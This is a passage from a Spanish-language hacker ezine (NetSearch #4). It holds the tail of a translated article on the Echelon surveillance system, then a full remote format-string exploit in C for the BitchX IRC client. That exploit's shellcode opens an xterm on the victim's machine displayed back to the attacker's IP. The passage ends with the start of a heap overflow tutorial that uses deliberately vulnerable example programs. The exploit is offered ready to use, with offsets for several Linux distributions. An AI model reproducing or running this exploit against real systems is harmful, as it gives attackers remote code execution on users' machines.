SILKWORTH, donde se aplican tecnicas de reconocimiento de voz y OCR (Optical
Character Recognition, Reconocimiento optico de Caracteres).

	Estos sistemas estan muy por encima del state-of-the-art, del
panorama actual. MAGISTRAND es la parte del supercomputador SILKWORTH que
dirige los poderosos programas de busqueda [24]. El software de busqueda de
la compañia britanica Memex [25], se mueve por las bases de datos de mensajes
y documentos de texto buscando palabras y frases clave, en base a complejos
algoritmos. Los sistemas de reconocimiento de voz transcriben conversaciones
convirtiendolas en mensajes de texto, para su analisis posterior. Un potente
software, VOICECAST, es capaz de captar voces de individuos concretos para
detectar todas las llamadas con la voz de esa persona.

[24] Mencionado en "The Hill". Ver nota [21].

[25] En la web de Memex se pueden consultar sus productos de Defensa e
Inteligencia, asi como sus contratos.
http://www.memex.co.uk/prod/intelligence/comm.html

	Con una velocidad de trabajo de millones de mensajes por hora, los
sistemas de Echelon trabajan a todas horas (24 horas al dia, todos los dias
del año), buscando secuencias de palabras, numeros de telefono y fax, y
especialmente voces de personas concretas. Cabe destacar que muy pocos
mensajes se transcriben y almacenan, la mayoria son desechados tras haber
sido "leidos" o "escuchados" electronicamente; solo los que satisfacen las
busquedas se guardan para ser analizados. Una vez mas, la potencia de Echelon
no deriva solo de su alta capacidad computacional, sino de las herramientas y
la tecnologia que hacen posible la clasificacion de la informacion
interceptada.

	Cada estacion tiene una lista de palabras (el "diccionario")
elaborada por las agencias de inteligencia de los diferentes paises. Un
"gestor de diccionarios" de cada agencia se ocupa de añadir, borrar o cambiar
criterios de busqueda de sus diccionarios en cada base [26]. A cada
diccionario se le asigna un nombre en clave, como COWBOY para el de Yakima o
FLINTLOCK para el de Waihopai [27]. Estos nombres ayudan a los analistas
humanos a identificar la fuente de los mensajes.


[26] "Secret Power", p. 49. Ver nota [3].

[27] idem. Pp. 165-166.

	Cada mensaje que satisface de la busqueda se ordena segun un codigo
de 4 digitos que indica la fuente o el asunto del mensaje (por ejemplo, 5535
para trafico diplomatico japones, u 8182 para comunicaciones sobre
distribucion de tecnologias de encriptacion [28]), asi como fecha, hora, y
codigo de la base que intercepto el mensaje. Las cabeceras incluyen tambien
los nombres en clave de la agencia que tratara el mensaje: alfa-alfa (GCHQ),
eco-eco (DSD), india-india (GCSB), uniform-uniform (CSE) y oscar-oscar (NSA).
Despues, estos mensajes se transmiten a la central de cada agencia por un
sistema global, PLATFORM [29], que constituye el nucleo de las bases y
agencias de UKUSA.

[28] idem, p. 44.

[29] "The Puzzle Palace: Inside the National Security Agency, America's Most
Secret Intelligence Organization" ("El palacio del rompecabezas: dentro de la
NSA, el servicio de inteligencia mas secreto de America"). James Bradford.
New York: Penguin Books, 1.983. pp. 138-139.
http://www.amazon.com/exec/obidos/ASIN/0140067485/qid=909414754/sr=1-2/002-3
166366-4403036

	Diariamente, el personal de analisis de cada agencia revisa el
material del dia anterior. Segun se analiza, desencripta y traduce cada
mensaje, dandole el tratamiento apropiado:

  . Informes: transcripciones completas de los mensajes interceptados.
  . Extractos: informacion basica sobre una serie de mensajes dentro de una
categoria determinada.
  . Resumenes: combinan informes y extractos [30].

[30] "Secret Power", p. 45. Ver nota [3].

La informacion interceptada y los documentos resultantes de su tratamiento se
clasifican, pues, bajo uno de estos grados:

  . MORAY: secreto.
  . SPOKE: secreto de mas alto grado que MORAY.
  . UMBRA: alto secreto, top secret.
  . GAMMA: intercepciones rusas.
  . DRUID: informacion cedida a paises ajenos a UKUSA.

La informacion manejada durante todos estos procedimientos es la base de todo
el Proyecto Echelon, y el sustento de la alianza UKUSA.


				----

	Hasta aqui por hoy. Y lo dicho, en el proximo numero mas. De momento,
espero que con este documento hayais sacado una idea general de la
envergadura de este gigante, este Gran Hermano, que representa Echelon...

	Para terminar, quisiera dar las gracias una vez mas a Patrick Poole,
el autor del texto original en ingles. Aqui podeis ver lo que me contesto
cuando le pedi permiso para escribir esta traduccion:

	My sincere thanks for your offer, and let this email serve as 
	permission to do such. As you agreed, I would request that I be 
	given credit in the translation (understanding, of course, that you 
	would be named as the translator) and that you forward an 
	electronic copy to me once it is published.

	Thanks again,

	Patrick Poole

Desde luego, queda poca gente asi en el mundo ;) asi que nada, Thank You Mr.
Poole y hasta el proximo numero...

				Pope!



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x13 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Bugs && Xploits]-========================================================
=-[ por NetSearch ]-=========================================================




Pues bien, como estareis comprobando ahora mismo con este numero estrenamos
otra seccion nueva, la hemos llamado Bugs && Xploits :). En esta seccion
(que intentaremos que sea fija) iremos publicando nuevos bugs o xploits
desarrollados exclusivamente por miembros del Staff. Es una tarea dificil,
pero vamos a intentarlo..

Para este numero RaiSe ha desarollado un xploit remoto para el conocido
cliente de irc BitchX. Muchos sabreis que las versiones anteriores a la
BitchX-1.0c17 son vulnerables a uno de los llamados 'bugs de formato'. Hasta
ahora no habia xploit publicado (o al menos no lo hemos encontrado..),
quizas pq nadie se habia molestado en hacerlo.. hasta que a RaiSe le dio la
venada y bueno.. aqui lo teneis :).

Y ahora una breve explicacion de su funcionamiento.. El xploit aprovecha un
bug de formato existente en la funcion p_invite(), al hacer una llamada a
logmsg() sin especificar el formato (valga la redundancia). Debido a que
no se puede hacer un 'invite' en el irc a un canal que contenga retornos de
linea, etc., RaiSe ha optado por no liarse demasiado y meter la shellcode en
otro sitio. De esta forma la shellcode se envia primero en un ctcp, y luego
se envia el invite con la cadena de formato para sobreescribir la direccion
de retorno haciendo que apunte a la shellcode. Por cierto que la misma
tambien ha sido desarrollada por el (vease arti 0x04 ;) ), es la del xterm
con una pequeña modificacion; una llamada a fork() para que el BitchX no se
quede bloqueado hasta que se cierre el xterm remoto.

El xploit tiene unos pequeños inconvenientes, debido a que la direccion de
retorno tiene que ser exacta es posible que algunas veces no funcione.. Los
offsets predefinidos son para redhat 6.0, redhat 7.0 y debian 2.2. Aun asi
tienen que cumplirse una serie de condiciones:


      . El BitchX tiene que estar corriendo en consola, no en las X.

      . La maquina donde se ejecutara el xploit tiene q tener el identd
        cerrado.

      . Si usuario que ejecuto el BitchX es el root hay muchas posibilidades
        de que no funcione ya que la direccion de retorno se decrementa en
        0x20 bytes. 

      . La version debe ser BitchX-1.0c16.


Pues nada mas, aqui teneis el xploit ;). 


<++> bugs&&xploits/xp-bitchx.c $aae3f3cd93834c7b28d6520216e210b2
/*
 *  BitchX Xploit by RaiSe
 *  Tested with version 1.0c16(+) in:        redhat 6.0 (2.2.16)
 *                                           redhat 7.0 (2.2.16)
 *                                           debian 2.2 (2.2.16)
 *
 *  NetSearch Ezine Staff
 *  http://www.netsearch-ezine.com
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>

#define PORT 6667

int soc_local,snick;
struct sockaddr_in addr_local;
struct hostent *server;
char buf[1024], cmd[512], formatbuf[1024], ip[64], *p;

int irc(char *n,char *s,char *sc);
int format(int v);

static char shellcode[256] =    // by RaiSe
"\xeb\x5b\x5e\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xc3\x75\x47\x31"
"\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b\x31\xc9\xb1\x09"
"\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88\x34\x32\x31\xd2"
"\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d\x7e\x19\x89\x7e"
"\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e\x36\x8d\x56\x46"
"\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xa0\xff"
"\xff\xff/usr/X11R6/bin/xterm8-ut8-display8";

char nops4[] = "\x90\x90\x90\x90";


// main()
int main(int argc, char *argv[])
{

        if (argc!=5)
        {       
                printf("\nBitchX Xploit by RaiSe\n");
                printf("http://www.netsearch-ezine.com\n");
                printf("\nuse: %s nick irc-server my-ip dist\n",argv[0]);
                printf("\ndist = 1 --> redhat 6.0\n"
                                "dist = 2 --> redhat 7.0\n"
                                "dist = 3 --> debian 2.2\n\n");
                exit(0);
        }

        sprintf(ip,"%s:0K",argv[3]);
        strcat(shellcode,ip);

        printf("\nBitchX Xploit by RaiSe\n");
        printf("http://www.netsearch-ezine.com\n");
        puts("\ndoing it..");

        snick=strlen(argv[1]);
        format(atoi(argv[4]));
        irc (argv[1],argv[2],formatbuf);
        printf("finished\n\n");

        return(0);

} // end main()

// irc()
int irc(char *n,char *s,char *sc)
{

        if ((server = gethostbyname(s)) == 0) 
        {
                printf("error al resolver el host\n");
                exit(0);
        }

        if ((soc_local=socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("error al crear el socket\n");
                exit(0);
        }

        bzero((char *) &addr_local, sizeof(addr_local));

        addr_local.sin_family = AF_INET;
        addr_local.sin_port = htons(PORT);
        memcpy(&addr_local.sin_addr, server->h_addr, server->h_length);

        if ((connect(soc_local,(struct sockaddr *) &addr_local,sizeof(addr_local)))
                        == -1)
        {
                printf("error al conectar con el servidor\n");
                exit(0);
        }

        p=buf;

        // user
        sprintf(cmd,"user k k k k\n");
        write(soc_local,cmd,strlen(cmd));

        // nick
        sprintf(cmd,"nick rxkfe\n");
        write(soc_local,cmd,strlen(cmd));

        // pong
        while(1)
        {
                read(soc_local,p,1);
                if ((*p=='\n') && (strstr(buf,"PING :")))
                {
                        p = (strstr(buf,"PING :")) + strlen("PING :");
                        sprintf(cmd,"PONG %s",p);
                        write(soc_local,cmd,strlen(cmd));
                        break;
                }
                if (*p=='\n')
                        p=buf;
                p++;
        } 

        // ctcp
        sprintf(cmd,"privmsg %s :\x01%s%s%s%s%s%s\x01\n"
                        ,n,nops4,nops4,nops4,nops4,nops4,shellcode);

        write(soc_local,cmd,strlen(cmd));

        sleep(2);

        // invite
        sprintf(cmd,"invite %s #%s\n",n,sc);
        write(soc_local,cmd,strlen(cmd));

        sleep(2);
        return(0);

} // end irc()

// format()
int format(int v)
{

        if ((v!=1) && (v!=2) && (v!=3))
        {
                printf("\ndist = 1 --> redhat 6.0\n"
                       "dist = 2 --> redhat 7.0\n"
                       "dist = 3 --> debian 2.2\n\n");
                printf("exiting..\n\n");
                exit(0);
        }


if (v==1)
{
int n, nr, a1, nx, nn = 0x150;
char dire[4][8] = { "\x60","\x61","\x62","\x63" };
int a2 = 0x1b5 - 0xdb;
int a3 = 0xff - 0xb5;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 126;
        nr = 0x6;
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 126;
        nr = 0x5;
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 126;
        nr = 0x4;
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 126;
        nr = 0x3;
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 126;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 129;
        nr = 0x5;
        nn = 0x158;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 129;
        nr = 0x4;
        nn = 0x158;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 129;
        nr = 0x3;
        nn = 0x158;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 129;
        nr = 0x2;
        nn = 0x158;
}

a1 = 0x10db - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

if (v==2)
{
int n, nr, a1, nx, nn = 0x138;
char dire[4][8] = { "\xbc","\xbd","\xbe","\xbf" };
int a2 = 0x1b2 - 0xc1;
int a3 = 0xff - 0xb2;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 117;
        nr = 0x6;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 117;
        nr = 0x5;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 117;
        nr = 0x4;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 117;
        nr = 0x3;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 117;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 120;
        nr = 0x5;
        nn = 0x140;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 120;
        nr = 0x4;
        nn = 0x140;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 120;
        nr = 0x3;
        nn = 0x140;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 120;
        nr = 0x2;
        nn = 0x140;
}

a1 = 0x10c1 - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

if (v==3)
{
int n, nr, a1, nx, nn = 0x180;
char dire[4][8] = { "\x80","\x81","\x82","\x83" };
int a2 = 0x1b3 - 0xa4;
int a3 = 0xff - 0xb3;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 144;
        nr = 0x6;
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 144;
        nr = 0x5;
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 144;
        nr = 0x4;
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 144;
        nr = 0x3;
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 144;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 147;
        nr = 0x5;
        nn = 0x188;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 147;
        nr = 0x4;
        nn = 0x188;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 147;
        nr = 0x3;
        nn = 0x188;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 147;
        nr = 0x2;
        nn = 0x188;
        strcpy(dire[0],"\x70");
        strcpy(dire[1],"\x71");
        strcpy(dire[2],"\x72");
        strcpy(dire[3],"\x73");
}

a1 = 0x10a4 - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

return(0);

} // end format()

// 0x00
<-->



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x14 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Heaps Overflows (1/2) ]-=================================================
=-[ por cafo ]-==============================================================




 Introduccion.
---------------

    La idea de este articulo nacio mientras estaba realizando una de las
pruebas del concurso de hackerslab (por si no sabeis de que va, es 
simplemente un concurso para 'hackers' dividido en 14 niveles, desde 
lo mas simple hasta algo mas complejo como programacion de sockets y 
cosas asi. Lo recomiendo como algo bastante entretenido :). Resulta que
en la prueba en cuestion te pedian que explotaras un heap overflow que
habia en un programa para pasar al siguiente nivel. Como suele pasar con
estas cosas, toda la info que encontre estaba en ingles y basicamente
todas las fuentes se basaban mas o menos directamente en un "tutorial" sobre
heaps overflows que se publico en w00w00.


    Pues nada, aprovechando que Netsearch va a sacar otro numero de ezine,
vamos a intentar explicar el asunto de forma mas o menos comprensible para
el usuario que no entienda bien el lenguaje yanki o simplemente sea tan
flojo como para no intentar traducirlo por su cuenta ;)


    Se supone que para entender todos los conceptos que envuelven a los
heap overflows se necesita (o por lo menos todos los sitios que he visto
lo da por supuesto) conocimientos de C, de ensamblador y de como funciona
por dentro la memoria del ordenador. Yo, por mi parte, intentare no dejar
muchas cosas al conocimiento previo de alguna de estas materias (bueno, de C 
si, pero a eso ya estamos acostumbrados, no? ;) e intentare empezar desde 0
(si alguno me acusa de poco 'elite' por este enfoque  que meta los pies en un 
barreño con agua mientras se seca el pelo con el secador, y vera como ve las 
cosas de otro color)


     Supongo que alguien habra puesto el tipico disclaimer diciendo que
los autores no se hacen responsables del uso que se les de a sus articulos
porque estos son solamente simple informacion y tal y cual... asi que paso
de repetir lo mismo de siempre ;).


    Empezamos...


 Algo simple: overflows pa lerdos.
----------------------------------

     Bueno, estamos delante de un ordenador que esta ejecutando un programa
y nos preguntamos "por que funciona este cacharro?". La verdad es que
explicar como hace lo que hace el procesador es un poco complejo (a mi me
llevo entenderlo 4 meses de una asignatura un pelin peñazo ;) pero podemos
hacer un resumen un poco tosco del mismo: tenemos un procesador que, como su
propio nombre indica, solo procesa los datos que estan en la memoria (o en 
el disco duro, etc). "Y como sabe el procesador la forma en que tiene que
procesar un determinado dato?"; pues simplemente, los programas le dicen 
mediante unos codigos binarios preprogramados cual es la siguiente instruccion
a ejecutar y con que datos debe hacerlo. "Y como sabe el procesador que lo que
esta procesando es un dato y no otra instruccion del programa que deberia 
ejecutar?"; pues eso el procesador no lo sabe, y precisamente este hecho es lo
que vamos a aprovechar nosotros para nuestros maleficos fines.


    Veamos, la memoria de un ordenador, como todos sabeis, es simplemente un
monton de registros en los que se puede almacenar 0 o 1's. No consiste en nada
mas que en eso. Por ejemplo, si tomamos una porcion muy pequeña de la memoria
y vemos lo que contiene, seguramente se parecera a esto:

   ---------------------------------------------------------------------
   ...00101001001010101111010101010001011010100011101010101010101001....
   ---------------------------------------------------------------------

y a lo mejor lo que quiere significar toda esta serie de digitos es esto:

   ---------------------------------------------------------------------
   ...00101001001010101111010101010001011010100011101010101010101001....
   ---------------------------------------------------------------------
   instruccion |    dato    |     dato    |    instruccion    |  instr...


     Ya desde la epoca de los primeros ordenadores existia la idea de poner
una etiqueta (un bit mas) en cada conjunto de datos para diferenciar si el
conjunto en cuestion era una instruccion o un dato; pero en aquella epoca
poner un bit mas era bastante caro y los resultados de los programas se
harian mucho mas lentamente al procesar un bit mas. Ademas, Von Neumman 
(un chavalote al que le debemos gran parte de los conceptos de los ordenadores
actuales) habia demostrado años atras que con una buena organizacion del 
procesador y un acceso bien ordenado a la memoria, no hacia falta diferenciar
entre instrucciones y datos puesto que el procesador responderia a una 
instruccion determinada y cogeria los datos que le indicaba la instruccion,
y como la instruccion siempre va a apuntar a una zona de memoria en la que
estan sus datos, pues no habia ningun problema.


     Seguro que la instruccion siempre va a apuntar a una zona de memoria
donde van a estar sus datos? Bueno.... eso habria que discutirlo....
Vamos a ver el ejemplo mas tonto de stack overflow que existe. Tenemos una
variable (es decir, uno de los 'datos' de la instruccion) y ejecutamos algo
tan simple como el programilla este:

......
main()
{
	char dato[20];
	....
	scanf("%s",&dato);
	....
}
....

y la memoria quedaria mas o menos asi (las x's representan instrucciones):

 ....xxxx|0000000000...0000000000|xxxxx......xxx|xxxxxxx......xxxxxxx|.....

             ^						^
	     la variable datos[20]			la instruccion scanf

pues nada, ya tenemos el juego listo. Lo normal es que el usuario,
cuando se le diga que meta el texto en cuestion para rellenar la variable 
datos[20], meta menos de 20 caracteres y entonces no hay problema; pero el 
problema aparece cuando le da por meter algunos mas. Resulta que el lenguaje
C no hace comprobacion de limites al ejecutar instrucciones como esas, entonces
lo que hace es simplmente seguir aceptando caracteres y guardandolos en
posiciones de memoria adyacentes a las de la variable dato[20], mas o menos
asi:

  caso 1: el usuario es buena gente

  -----------------------------------------------------
  .....|soy pepe000000000000|xxxxxxxxxxxxx...xxxx|.....
  -----------------------------------------------------

  caso 2: el usuario es un jaquerrr con ganas de hacer algo ilegal

  -----------------------------------------------------
  .....|soy un megahax0r jaj|ajajajaxxxxxxxx...xx|.....
  -----------------------------------------------------

  Aqui vemos como se han sobreescrito los primeros bits de la instruccion
siguiente a datos[20]. Lo normal que ocurra en estos casos es que el 
procesador, al intentar ejecutar esa instruccion que por supuesto no coincide
con ninguna valida, de un error y termine la ejecucion del programa. 


    Sin embargo, el truco consiste en sobreescribir la instruccion que sigue
a datos[20] para que sea algo que el procesador entienda. Lo mas usual es que
se sobreescriba con un salto hacia otra posicion de memoria donde hayamos 
puesto antes una llamada a una shell para que, en vez de ejecutar la 
instruccion, se ejecute una shell que nos daria acceso al sistema.
Graficamente:

  ........................................................
  ................datos[20]saltoxxxxxxxx..................
  ........................................................
  ........................................................
  ........................................................
  ....shell

y terminariamos la ejecucion del programa con una flamante shell recien
invocada :).


    Bueno, no me extiendo mas sobre el tema de en que consiste los overflows;
supongo que todos habeis captado la idea. Todo lo que he dicho hasta ahora
se refiere a los stacks overflows, de los que hay un montonazo de articulos
escritos tanto en castellano como en yanki-lengua, asi que si os interesa, solo
teneis que moveros por el mundo... (y tampoco mucho, este ezine trae de todo ;)


 Heaps Overflows.
------------------

    En los parrafos anteriores hemos visto la base de un stack overflow. No
es que sea muy complejo pero tiene ciertas curiosidades que hay que tener en
cuenta, como por ejemplo averiguar direcciones de retorno en las llamadas
a funciones y cosas asi (para saber mas, lo mejor es que os leais los
distintos artis publicados sobre el tema). Yo defiendo los heaps overflows
por su sencillez y su "pureza de lineas", como diria algun anuncio malo de
coches ;)

    Por supuesto, para entender lo que es un Heap Overflow, lo primero que
hay que saber que es lo que es el Heap ;). Veamos, un programa tiene dos
formas de pedir al SO memoria para hacer su trabajo. Una de ellas es la
tipica, que hemos usado antes:

	char datos[20]

con lo que el sistema asignaria una zona de memoria identificandola con el
nombre "datos" y de tamaño 20 bytes. Esta es la forma tradicional y
"estatica", es decir, que si en algun momento del programa necesitamos que en
la variable datos quepan 40 bytes, no podemos hacerlo.


    La otra forma, y es la que nos interesa, es que el programa pida en tiempo
de ejecucion (la otra forma se denomina "en tiempo de compilacion") la memoria
que necesita, entonces el SO busca memoria libre y, si hay disponible, se la
da al programa. Usualmente esto se hace con:

	char *datos;
        datos=(char *) malloc(TAMAÑO_DE_MEMORIA);

y el sistema devolveria en "datos" la zona de memoria asignada o, si no hay
libre, pondria datos a NULL. Aqui vemos que la variable "datos" ha dejado de
ser una variable en el sentido "clasico" de la palabra y pasa a ser un 
puntero que, como su propio nombre indica, lo que hace es apuntar a la primera
de una serie de posiciones de memoria.


     Alguien se debe estar preguntando ya "si un overflow consiste en 
sobreescribir una zona de memoria, como va a ser el SO tan tonto como para
darnos acceso mediante malloc() a una zona de memoria que ya esta siendo
ocupada?". Pues muy sencillo: el SO no es tonto. Bueno, no del todo :). El SO
simplemente hace lo que nosotros le digamos dentro de unos limites, asi que
nunca nos va a dar posiciones que ya estan usadas, pero nada nos impide a 
nosotros mismos movernos por esas posiciones. Lo que tenemos que tener en 
cuenta es que, como C no hace la comprobacion de que estamos escribiendo en 
la posicion de memoria que nos ha asignado el SO (si no comprueba limites en
las variables lo logico es que tampoco compruebe cosas como estas porque los
dos conceptos se basan en lo mismo: escribir en un sitio que no estaba
pensado para ti), siempre vamos a poder escribir en otra que sea
una posicion valida. Es decir, que si tenemos 2 zonas de memoria (no hace
falta que sean consecutivas) asignadas para dos variables, el SO nos va a
permitir escribir en la segunda usando la primera, y viceversa, por la sencilla
razon de que tanto la primera como la segunda apuntan a zonas de memoria que
has sido identificadas como "escribibles" por ese tipo de variables. Vamos a 
verlo con un ejemplo que queda muy clarito:

<++> heap/ejemplo1.c $5592ca44fdc06aa8f1d800ecf7fe6309
/* 
 * el ejemplo mas simple posible de un overflow en la zona heap
 *
 * basado directamente en uno de w00w00
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	char *dato1, *dato2;       /* nuestras variables */
	unsigned long distancia;   /* esta es la distancia real en memoria 
				      que van a tener nuestras variables.
				      si estuvieran las 2 en zonas de memoria
				      consecutivas, la distancia seria 0 */
	
	/* pedimos la asignacion de memoria. Vamos a pedir 40 bytes */
	dato1=(char *) malloc(40);
	dato2=(char *) malloc(40);

	/* miramos a cuanta distancia estan */
	distancia=(unsigned long) dato2 - (unsigned long) dato1;

	/* ahora rellenamos dato2 con una cadena normal y corriente. memset()
	   lo unico q hace es rellenar la posicion de memoria q se le pasa
	   con un caracter */
	memset(dato2,'P',40-1), dato2[40-1]='\0';
	printf("antes de sobreescribir: %s\n",dato2);

	/* sobreescribimos 20 bytes de dato2 usando la variable dato1 y la 
	   distancia que los separa (por si acaso esta no es 0) */

	memset(dato1,'*',(unsigned int)(distancia + 20));   

	/* comprobamos */
	printf("despues de sobreescribir: %s\n",dato2);

	return 0;
}
<-->

Pues ya lo tenemos, lo ejecutamos y vemos como el puntero dato1 sobreescribe
la zona que tiene asignada dato2; y el SO se lo permite por la sencilla razon
de que ambas zonas (la de dato2 y la que se 'supone' que tiene q usar
dato1) son del mismo tipo y estan inicializadas de la misma forma, y como
C no comprueba las direcciones pues es facil confundirlo para q piense que
dato1 se esta escribiendo en su sitio cuando en realidad estamos en la zona
de dato2.

[...]
cafo@thehost:~/nets/heap$ ./ejemplo1
antes de sobreescribir: PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
despues de sobreescribir: ********************PPPPPPPPPPPPPPPPPPP
[...]

Entonces el concepto ha quedado bastante claro, no? Solamente necesitamos
un puntero que se encuentre en la zona heap que podamos manejar para poder
tener acceso a todos los demas punteros de esa zona.

Bueno, tanto rollo sobre la zona heap y todavia no he explicado lo que es ;)
Pues el Heap es simplemente una zona de memoria dinamica donde almacenar
variables por medio de la llamada a malloc(). Posiblemente los que habeis
leido algun libro sobre arquitectura de SO y demas, os suene la pareja
HEAP/BSS. El BSS (y juro que no he podido encontrar por ningun lado que es lo
que significan esas puñeteras siglas ;) es simplemente la zona de memoria
donde se encuentran las variables globales que no son inicializadas y las
declaradas como 'estaticas'. Por ejemplo, si queremos disponer de memoria sin
tener que inicializarla pero queremos que se comporte como el puntero que
usabamos antes, podemos escribir algo como esto:

	static char dato1[40];

y seria el equivalente en la zona BSS a la llamada a malloc() que hicimos en 
el programilla anterior.

Bueno, una vez llegados a este punto mas de uno se preguntara "Y esto para
que me sirve a mi?". Pues la verdad es que si te preguntas eso es que todavia
te falta coger bastante practica con eso de los exploits ;). Bueno, en serio.
Simplemente tienes que encontrar un codigo fuente (bastante usual en estos
tiempos de codigo abierto...) que use una de estas variables que he comentado
y que permita al usuario escribirla. La situacion tipica es que el
programador use uno de estos punteros para pedir datos al usuario.

Imaginad que tenemos un programa que lo unico que hace es escribir lo que
nosotros le digamos en un fichero que no podemos elegir. Algo como esto:

<++> heap/ejemplo2.c $d102f90f44986e093acb7a01aef6d723
/*
 * ejemplo2.c       Muestra un programa vulnerable en la zona BSS
 */

#include <stdio.h>

int main()
{
  FILE *archivo;
  static char dato1[16], *tmpfile;

  tmpfile="/tmp/mama.txt";    /* ponemos un temporal cualquiera */
  printf("antes del exploit: %s\n",tmpfile); /* para asegurarnos... */

  printf("Datos a introducir en mama.txt: \n");
  gets(dato1);

  printf("\ndespues del exploit: %s\n",tmpfile);
  archivo=fopen(tmpfile,"w");

  fputs(dato1,archivo);
  fclose(archivo);
}
<-->

Pues ya tenemos el programa en cuestion. A simple vista no es vulnerable
porque lo unico que se puede modificar "externamente" es lo que se escribe en
el archivo "mama.txt" asi que no tendriamos ningun problema con la seguridad
del sistema, verdad? Ojala fuera asi, porque podemos usar lo que dijimos antes
de sobreescribir punteros para que el programa hiciera ciertas cosas no
deseables, como sobreescribir archivos de sistema o cosas asi, y siempre
podremos encontrar ficheros que al sobreescribir sean utiles, no?

Pues el truco en este caso esta en que la variable donde se guarda el 
nombre es un puntero mientras que donde nosotros guardamos los datos que 
queremos meter en el archivo esta en la zona BSS, con lo que nos permite
jugar un poco con las direcciones. Lo unico que debemos hacer es empezar a
probar distintos acercamientos a "*tmpfile" desde "datos1" hasta que logremos
sobreescribir por completo la posicion de *tmpfile con la direccion de un 
archivo que nos interese escribir. Veamoslo con un ejemplo:

